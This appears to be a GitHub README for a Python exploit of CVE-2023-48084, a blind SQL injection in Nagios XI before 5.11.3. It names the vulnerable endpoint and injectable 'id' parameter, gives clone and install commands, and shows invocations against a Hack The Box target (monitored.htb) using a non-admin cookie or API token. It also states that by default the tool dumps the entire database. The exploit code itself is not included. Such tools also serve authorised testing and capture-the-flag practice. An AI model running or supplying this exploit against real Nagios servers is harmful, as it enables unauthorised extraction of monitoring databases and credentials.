# CVE-2023-48084

Python exploit for the CVE-2023-48084 -> `Nagios XI before version 5.11.3 was discovered to contain a SQL injection vulnerability via the bulk modification tool.`

The exploit uses `/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=(<SQL COMMAND TO EXECUTE>)` to execute SQL queries, and exploits a blind SQL injection...


## Usage

Clone the repo and install the requirements.txt

```bash
git clone https://github.com/Hamibubu/CVE-2023-48084.git
cd CVE-2023-48084
pip install -r requirements.txt
```
Now execute the program, you need a non-admin session cookie, or an API token, example

```bash
python3 CVE-2023-48084.py --url https://monitored.htb/nagiosxi -a <token>
python3 CVE-2023-48084.py --url https://monitored.htb/nagiosxi -c <cookie>
```

## NOTE

For default it will try to dump all the database starting from schemas, if you want it more fast, just look at the code and take the part that you need
